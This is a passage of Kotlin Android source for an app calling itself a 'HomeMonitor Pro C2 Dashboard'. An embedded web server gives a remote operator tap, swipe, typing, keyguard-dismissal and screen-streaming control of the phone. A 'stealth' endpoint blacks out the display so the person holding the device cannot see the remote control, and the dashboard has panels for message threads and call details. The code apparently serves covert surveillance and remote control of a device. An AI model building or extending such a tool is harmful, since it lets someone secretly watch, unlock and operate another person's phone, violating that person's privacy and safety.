                                        outputStream.flush()
                                    } else {
                                        val geometry = WebStreamDisplayGeometryProvider.getGeometry(this@MonitorService)
                                        val json = JSONObject().apply {
                                            put("schemaVersion", 1)
                                            put("geometryVersion", geometry.geometryVersion)
                                            put("displayId", geometry.displayId)
                                            put("screenshotWidth", geometry.screenshotWidth)
                                            put("screenshotHeight", geometry.screenshotHeight)
                                            put("inputWidth", geometry.inputWidth)
                                            put("inputHeight", geometry.inputHeight)
                                            put("rotation", geometry.rotation)
                                            put("densityDpi", geometry.densityDpi ?: 420)
                                            put("coordinateSpace", geometry.coordinateSpace)
                                            put("isValid", geometry.isValid)
                                            put("mapping", JSONObject().apply { put("type", "identity") })
                                        }.toString()

                                        val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$json"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                    }
                                }

                                cleanPath == "/api/calibration" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val geometry = WebStreamDisplayGeometryProvider.getGeometry(this@MonitorService)

                                    if (method == "GET") {
                                        val profile = WebStreamCalibrationManager.getActiveProfile(geometry.geometryVersion)
                                        val respJson = profile?.toJson()?.toString() ?: "{\"status\":\"uncalibrated\",\"geometryVersion\":${geometry.geometryVersion}}"
                                        val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                        outputStream.write(resp.toByteArray())
                                    } else if (method == "POST") {
                                        if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                            val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid CSRF token\"}"
                                            outputStream.write(resp.toByteArray())
                                            outputStream.flush()
                                            return@launch
                                        }

                                        val pointsList = mutableListOf<CalibrationPoint>()
                                        try {
                                            val json = JSONObject(bodyString)
                                            val arr = json.optJSONArray("points") ?: JSONArray()
                                            for (i in 0 until arr.length()) {
                                                val obj = arr.getJSONObject(i)
                                                pointsList.add(
                                                    CalibrationPoint(
                                                        expectedU = obj.getDouble("u"),
                                                        expectedV = obj.getDouble("v"),
                                                        observedX = obj.getDouble("x").toFloat(),
                                                        observedY = obj.getDouble("y").toFloat()
                                                    )
                                                )
                                            }
                                        } catch (e: Exception) {
                                            val resp = "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Malformed calibration points JSON: ${e.message}\"}"
                                            outputStream.write(resp.toByteArray())
                                            outputStream.flush()
                                            return@launch
                                        }

                                        val profile = WebStreamCalibrationManager.computeCalibrationProfile(pointsList, geometry)
                                        val respJson = profile.toJson().toString()
                                        val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                        outputStream.write(resp.toByteArray())
                                    }
                                    outputStream.flush()
                                }

                                cleanPath == "/api/telemetry" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val summary = WebStreamTelemetryManager.getSummary()
                                    val respJson = JSONObject().apply {
                                        put("totalReceived", summary.totalReceived)
                                        put("totalCompleted", summary.totalCompleted)
                                        put("totalCancelled", summary.totalCancelled)
                                        put("totalRejected", summary.totalRejected)
                                        put("medianServerLatencyMs", summary.medianServerLatencyMs)
                                        put("p95ServerLatencyMs", summary.p95ServerLatencyMs)
                                        put("completionRatePct", summary.completionRatePct.toDouble())
                                    }.toString()

                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/input/tap" || cleanPath == "/click" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    var relX = 0f
                                    var relY = 0f
                                    try {
                                        val json = JSONObject(bodyString)
                                        relX = json.optDouble("relX", 0.0).toFloat()
                                        relY = json.optDouble("relY", 0.0).toFloat()
                                    } catch (_: Exception) {
                                        relX = pathUri.getQueryParameter("relX")?.toFloatOrNull() ?: 0f
                                        relY = pathUri.getQueryParameter("relY")?.toFloatOrNull() ?: 0f
                                    }

                                    if (relX.isNaN() || relY.isNaN() || relX < 0.0f || relX > 1.0f || relY < 0.0f || relY > 1.0f) {
                                        val resp = "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Out of bounds or malformed tap coordinates\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val (screenWidth, screenHeight) = getScreenMetrics()
                                    val maxW = (screenWidth - 1f).coerceAtLeast(0f)
                                    val maxH = (screenHeight - 1f).coerceAtLeast(0f)
                                    val realX = (relX * screenWidth).coerceIn(0f, maxW)
                                    val realY = (relY * screenHeight).coerceIn(0f, maxH)

                                    AppAccessibilityService.instance?.dispatchTap(realX, realY)
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/input/swipe" || cleanPath == "/swipe" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    var startXRel = 0.5f; var startYRel = 0.5f; var endXRel = 0.5f; var endYRel = 0.5f; var duration = 300L
                                    try {
                                        val json = JSONObject(bodyString)
                                        startXRel = json.optDouble("startX", 0.5).toFloat()
                                        startYRel = json.optDouble("startY", 0.5).toFloat()
                                        endXRel = json.optDouble("endX", 0.5).toFloat()
                                        endYRel = json.optDouble("endY", 0.5).toFloat()
                                        duration = json.optLong("duration", 300L)
                                    } catch (_: Exception) {
                                        startXRel = pathUri.getQueryParameter("startX")?.toFloatOrNull() ?: 0.5f
                                        startYRel = pathUri.getQueryParameter("startY")?.toFloatOrNull() ?: 0.5f
                                        endXRel = pathUri.getQueryParameter("endX")?.toFloatOrNull() ?: 0.5f
                                        endYRel = pathUri.getQueryParameter("endY")?.toFloatOrNull() ?: 0.5f
                                        duration = pathUri.getQueryParameter("duration")?.toLongOrNull() ?: 300L
                                    }

                                    if (startXRel.isNaN() || startYRel.isNaN() || endXRel.isNaN() || endYRel.isNaN() ||
                                        startXRel < 0.0f || startXRel > 1.0f || startYRel < 0.0f || startYRel > 1.0f ||
                                        endXRel < 0.0f || endXRel > 1.0f || endYRel < 0.0f || endYRel > 1.0f ||
                                        duration < 50L || duration > 3000L) {
                                        val resp = "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Malformed or out-of-bounds swipe parameters\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val (screenWidth, screenHeight) = getScreenMetrics()
                                    val maxW = (screenWidth - 1f).coerceAtLeast(0f)
                                    val maxH = (screenHeight - 1f).coerceAtLeast(0f)
                                    val startX = (startXRel * screenWidth).coerceIn(0f, maxW)
                                    val startY = (startYRel * screenHeight).coerceIn(0f, maxH)
                                    val endX = (endXRel * screenWidth).coerceIn(0f, maxW)
                                    val endY = (endYRel * screenHeight).coerceIn(0f, maxH)

                                    AppAccessibilityService.instance?.dispatchSwipe(startX, startY, endX, endY, duration)
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/input/gesture" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    if (bodyString.isBlank() || bodyString.length > 32768) {
                                        val resp = "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Missing or oversized gesture request body (max 32KB)\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val requestDto = try {
                                        GestureRequestDto.fromJson(bodyString)
                                    } catch (e: Exception) {
                                        val resp = "HTTP/1.1 400 Bad Request\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Malformed gesture JSON schema: ${e.message}\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val result = WebStreamGestureController.dispatchGestureRequest(requestDto, this@MonitorService)
                                    when (result) {
                                        is DispatchResult.Success -> {
                                            val respJson = JSONObject().apply {
                                                put("status", "ok")
                                                put("requestId", result.requestId)
                                                put("strokeCount", result.strokeCount)
                                            }.toString()
                                            val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                            outputStream.write(resp.toByteArray())
                                        }
                                        is DispatchResult.Error -> {
                                            val respJson = JSONObject().apply {
                                                put("error", result.reason)
                                            }.toString()
                                            val httpCode = if (result.reason.startsWith("Duplicate") || result.reason.startsWith("Gesture dispatcher is busy")) "409 Conflict" else "400 Bad Request"
                                            val resp = "HTTP/1.1 $httpCode\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n$respJson"
                                            outputStream.write(resp.toByteArray())
                                        }
                                    }
                                    outputStream.flush()
                                }

                                cleanPath == "/api/input/type" || cleanPath == "/type" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val text = try {
                                        JSONObject(bodyString).optString("text", "")
                                    } catch (_: Exception) {
                                        pathUri.getQueryParameter("text") ?: ""
                                    }

                                    val sanitizedText = if (text.length > 500) text.substring(0, 500) else text
                                    AppAccessibilityService.instance?.typeText(sanitizedText)
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/input/action" || cleanPath == "/action" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val act = try {
                                        JSONObject(bodyString).optString("id", "2").lowercase().trim()
                                    } catch (_: Exception) {
                                        pathUri.getQueryParameter("id")?.lowercase()?.trim() ?: "2"
                                    }

                                    val accessService = AppAccessibilityService.instance
                                    when (act) {
                                        "1", "back" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
                                        "2", "home" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                        "3", "recents" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS)
                                        "4", "notifications" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                                        "5", "quicksettings" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                                        "6", "power" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                                        "8", "lock" -> handleRemoteLock("")
                                        "9", "screenshot" -> accessService?.performGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                                        "24", "volup" -> dispatchVolumeKey(android.view.KeyEvent.KEYCODE_VOLUME_UP)
                                        "25", "voldown" -> dispatchVolumeKey(android.view.KeyEvent.KEYCODE_VOLUME_DOWN)
                                        else -> {
                                            val actInt = act.toIntOrNull() ?: 2
                                            accessService?.performGlobal(actInt)
                                        }
                                    }
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/control/stealth" || cleanPath == "/stealth" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val mode = try {
                                        JSONObject(bodyString).optString("mode", "toggle").lowercase().trim()
                                    } catch (_: Exception) {
                                        pathUri.getQueryParameter("mode")?.lowercase() ?: "toggle"
                                    }

                                    val accessService = AppAccessibilityService.instance
                                    when (mode) {
                                        "on", "enable", "true" -> accessService?.showBlackScreenOverlay()
                                        "off", "disable", "false" -> accessService?.hideBlackScreenOverlay()
                                        else -> {
                                            if (accessService?.isOverlayShowing == true) {
                                                accessService.hideBlackScreenOverlay()
                                            } else {
                                                accessService?.showBlackScreenOverlay()
                                            }
                                        }
                                    }
                                    val isShowing = accessService?.isOverlayShowing ?: false
                                    val respStr = if (isShowing) "ON" else "OFF"
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\",\"mode\":\"$respStr\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/api/control/unlock" || cleanPath == "/unlock" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }
                                    if (!WebStreamSessionManager.validateCsrf(session, csrfHeader)) {
                                        val resp = "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Invalid or missing CSRF Token\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    AppAccessibilityService.instance?.dismissKeyguard()
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"status\":\"ok\"}"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }

                                cleanPath == "/stream" -> {
                                    val session = WebStreamSessionManager.getSession(sessionIdCookie)
                                    if (session == null) {
                                        val resp = "HTTP/1.1 401 Unauthorized\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"error\":\"Unauthorized stream access\"}"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    WebStreamSessionManager.registerStreamSocket(session, socket)
                                    activeSubscriberSockets[socket] = session.id
                                    startSharedFrameBroadcasterLoop()

                                    try {
                                        val header = "HTTP/1.1 200 OK\r\n" +
                                                     "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n" +
                                                     "Cache-Control: no-cache\r\n" +
                                                     "Connection: close\r\n\r\n"
                                        outputStream.write(header.toByteArray())
                                        outputStream.flush()

                                        while (isActive && !socket.isClosed && !session.isExpired()) {
                                            delay(500)
                                        }
                                    } finally {
                                        activeSubscriberSockets.remove(socket)
                                        WebStreamSessionManager.unregisterStreamSocket(session, socket)
                                    }
                                }

                                else -> {
                                    if (isUserRole && com.homemonitor.C2TrialManager.isTrialExpired(this@MonitorService)) {
                                        val trialMsgEscaped = com.homemonitor.C2TrialManager.getTrialMessage(this@MonitorService)
                                            .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;")
                                        val lockedHtml = """
                                            <!DOCTYPE html>
                                            <html lang="en">
                                            <head>
                                                <meta charset="UTF-8">
                                                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                                                <title>Demo Period Expired - HomeMonitor Pro</title>
                                                <style>
                                                    * { box-sizing: border-box; margin: 0; padding: 0; }
                                                    body { background-color: #090d16; color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; padding: 20px; }
                                                    .lock-card { background: #0f172a; border: 1px solid #dc2626; border-radius: 16px; width: 100%; max-width: 480px; padding: 32px; text-align: center; box-shadow: 0 10px 30px rgba(220, 38, 38, 0.3); }
                                                    .lock-icon { font-size: 56px; margin-bottom: 16px; }
                                                    .lock-title { font-size: 22px; font-weight: 800; color: #ef4444; margin-bottom: 12px; }
                                                    .lock-badge { display: inline-block; background: #7f1d1d; color: #fca5a5; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; }
                                                    .lock-msg { font-size: 14px; color: #cbd5e1; line-height: 1.6; background: #1e293b; padding: 16px; border-radius: 10px; border-left: 4px solid #ef4444; margin-bottom: 24px; text-align: left; }
                                                    .contact-box { font-size: 13px; color: #94a3b8; border-top: 1px solid #1e293b; padding-top: 16px; }
                                                </style>
                                            </head>
                                            <body>
                                                <div class="lock-card">
                                                    <div class="lock-icon">🔒</div>
                                                    <div class="lock-title">Demo Period Expired</div>
                                                    <div class="lock-badge">Trial Expired / Purchase Required</div>
                                                    <div class="lock-msg">$trialMsgEscaped</div>
                                                    <div class="contact-box">
                                                        Please contact your administrator or purchase full app license to restore access to the Web Control Dashboard.
                                                    </div>
                                                </div>
                                            </body>
                                            </html>
                                        """.trimIndent()
                                        val resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: ${lockedHtml.toByteArray().size}\r\n\r\n$lockedHtml"
                                        outputStream.write(resp.toByteArray())
                                        outputStream.flush()
                                        return@launch
                                    }

                                    val html = """
                                        <!DOCTYPE html>
                                        <html lang="en">
                                        <head>
                                            <meta charset="UTF-8">
                                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                                            <title>HomeMonitor Pro C2 Dashboard</title>
                                            <style>
                                                * { box-sizing: border-box; margin: 0; padding: 0; }
                                                body { background-color: #090d16; color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; height: 100vh; overflow: hidden; }

                                                /* Sidebar Navigation (HomeMonitor Layout) */
                                                .sidebar { width: 240px; background: #0f172a; border-right: 1px solid #1e293b; display: flex; flex-direction: column; flex-shrink: 0; }
                                                .sidebar-brand { padding: 18px 16px; font-size: 16px; font-weight: 800; color: #38bdf8; letter-spacing: 0.05em; border-bottom: 1px solid #1e293b; display: flex; align-items: center; gap: 8px; }
                                                .sidebar-menu { list-style: none; padding: 12px 8px; flex: 1; overflow-y: auto; }
                                                .sidebar-item { padding: 10px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; color: #94a3b8; cursor: pointer; display: flex; align-items: center; gap: 10px; margin-bottom: 4px; transition: all 0.15s ease; }
                                                .sidebar-item:hover { background: #1e293b; color: #f8fafc; }
                                                .sidebar-item.active { background: #0284c7; color: #ffffff; }

                                                /* Main Container */
                                                .main-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: #090d16; }

                                                /* Header Bar */
                                                .header-bar { height: 56px; background: #0f172a; border-bottom: 1px solid #1e293b; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
                                                .header-left { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 700; color: #f8fafc; }
                                                .header-badges { display: flex; align-items: center; gap: 8px; }

                                                .badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: 700; }
                                                .badge-live { background: #065f46; color: #34d399; }
                                                .badge-active { background: #0284c7; color: #e0f2fe; }
                                                .badge-idle { background: #374151; color: #9ca3af; }
                                                .badge-stealth { background: #581c87; color: #e9d5ff; }

                                                .btn { background: #1e293b; color: #f8fafc; border: 1px solid #334155; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; user-select: none; transition: all 0.12s ease; }
                                                .btn:hover { background: #38bdf8; color: #0f172a; border-color: #38bdf8; }
                                                .btn:active { transform: scale(0.96); }
                                                .btn-success { border-color: #10b981; }
                                                .btn-success:hover { background: #10b981; color: #fff; }
                                                .btn-danger { border-color: #ef4444; }
                                                .btn-danger:hover { background: #ef4444; color: #fff; }

                                                /* View Panels */
                                                .content-area { flex: 1; padding: 20px; overflow-y: auto; }
                                                .panel { display: none; }
                                                .panel.active { display: block; }

                                                /* Cards Grid */
                                                .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 16px; margin-bottom: 20px; }
                                                .card { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
                                                .card h3 { font-size: 14px; font-weight: 700; color: #94a3b8; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; }
                                                .card-val { font-size: 22px; font-weight: 800; color: #38bdf8; }

                                                /* Tables */
                                                .data-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; text-align: left; }
                                                .data-table th { background: #1e293b; padding: 10px 14px; color: #94a3b8; font-weight: 700; }
                                                .data-table td { padding: 10px 14px; border-bottom: 1px solid #1e293b; color: #cbd5e1; }

                                                /* Master-Detail Split View */
                                                .split-chat-container { display: flex; height: calc(100vh - 120px); border: 1px solid #1e293b; border-radius: 12px; overflow: hidden; background: #0b0f19; }
                                                .thread-list-pane { width: 320px; background: #0f172a; border-right: 1px solid #1e293b; display: flex; flex-direction: column; flex-shrink: 0; }
                                                .thread-list-header { padding: 14px; font-size: 13px; font-weight: 700; color: #94a3b8; border-bottom: 1px solid #1e293b; }
                                                .thread-items-scroll { flex: 1; overflow-y: auto; }
                                                .thread-card { padding: 12px 16px; border-bottom: 1px solid #1e293b; cursor: pointer; display: flex; align-items: center; gap: 12px; transition: background 0.15s ease; }
                                                .thread-card:hover { background: #1e293b; }
                                                .thread-card.active { background: #0284c7; color: #fff; }
                                                .thread-card.active .thread-snippet { color: #e0f2fe; }

                                                .avatar-circle { width: 42px; height: 42px; border-radius: 50%; background: #0284c7; color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 15px; flex-shrink: 0; }
                                                .thread-info { flex: 1; min-width: 0; }
                                                .thread-name { font-size: 14px; font-weight: 700; color: #f8fafc; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
                                                .thread-snippet { font-size: 12px; color: #94a3b8; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 2px; }

                                                /* Message Pane & Speech Bubbles */
                                                .thread-content-pane { flex: 1; display: flex; flex-direction: column; background: #090d16; padding: 20px; overflow-y: auto; }
                                                .messages-scroll { flex: 1; display: flex; flex-direction: column; gap: 14px; overflow-y: auto; padding-right: 8px; }
                                                .msg-row { display: flex; align-items: flex-start; gap: 10px; }
                                                .msg-row.out { justify-content: flex-end; }
                                                .msg-bubble-in { background: #1e293b; color: #f1f5f9; padding: 12px 16px; border-radius: 12px 12px 12px 2px; max-width: 70%; font-size: 13px; line-height: 1.5; border: 1px solid #334155; }
                                                .msg-bubble-out { background: #0284c7; color: #ffffff; padding: 12px 16px; border-radius: 12px 12px 2px 12px; max-width: 70%; font-size: 13px; line-height: 1.5; }
                                                .msg-time { font-size: 10px; color: #94a3b8; margin-top: 4px; text-align: right; }

                                                /* Call Detail View */
                                                .call-detail-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
                                                .call-avatar-large { width: 90px; height: 90px; border-radius: 50%; background: linear-gradient(135deg, #7c3aed, #2563eb); color: #fff; font-size: 32px; font-weight: 800; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; box-shadow: 0 10px 25px rgba(124, 58, 237, 0.4); }
                                                .call-name-large { font-size: 22px; font-weight: 800; color: #f8fafc; margin-bottom: 4px; }
                                                .call-number-sub { font-size: 14px; font-weight: 700; color: #94a3b8; margin-bottom: 20px; }
                                                .call-meta-box { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 16px 24px; width: 300px; text-align: left; }
                                                .call-meta-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1e293b; font-size: 13px; color: #cbd5e1; }
                                                .call-meta-row:last-child { border-bottom: none; }

                                                /* Screen Container */
                                                .screen-wrapper { display: flex; gap: 20px; align-items: flex-start; justify-content: center; flex-wrap: wrap; }
                                                .screen-container { border: 3px solid #1e293b; border-radius: 12px; overflow: hidden; background: #000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); position: relative; }
                                                img#stream { display: block; max-width: 100%; max-height: 65vh; cursor: crosshair; }

                                                /* Modal & 2FA Overlay */
                                                .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(9, 13, 22, 0.95); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; z-index: 9999; }
                                                .modal-card { background: #0f172a; border: 1px solid #334155; border-radius: 16px; padding: 28px; width: 90%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.9); text-align: center; }
                                                .input-field { width: 100%; background: #1e293b; border: 1px solid #334155; color: #fff; padding: 10px 14px; border-radius: 8px; font-size: 14px; outline: none; margin-bottom: 12px; text-align: center; }
                                                .input-field:focus { border-color: #38bdf8; }
                                            </style>
                                        </head>
                                        <body>

                                            <!-- 2FA Login Modal -->
                                            <div id="loginModal" class="modal-overlay" style="display:none;">
                                                <div class="modal-card">
                                                    <h2 style="color:#38bdf8; font-size:20px; margin-bottom:8px;">🔒 HomeMonitor Pro C2 Login</h2>
                                                    <p style="color:#94a3b8; font-size:13px; margin-bottom:18px;">Master Passcode + 2FA Microsoft / Bitwarden Authenticator</p>
                                                    <form onsubmit="doLogin(event)">
                                                        <input id="passInput" type="password" class="input-field" placeholder="Master Passcode" required />
                                                        <input id="totpInput" type="text" class="input-field" placeholder="6-Digit 2FA Code (e.g. 123456)" maxlength="6" autocomplete="off" />
                                                        <button type="submit" class="btn btn-success" style="width:100%; padding:10px; justify-content:center; font-size:14px;">Unlock Dashboard</button>
                                                    </form>
                                                    <p id="loginErr" style="color:#ef4444; font-size:13px; margin-top:12px; display:none;"></p>
                                                    <div style="margin-top:16px; border-top:1px solid #1e293b; padding-top:12px;">
                                                        <button class="btn" onclick="open2faSetupModal()" style="font-size:11px;">📲 Pair Microsoft/Bitwarden 2FA App</button>
                                                    </div>
                                                </div>
                                            </div>

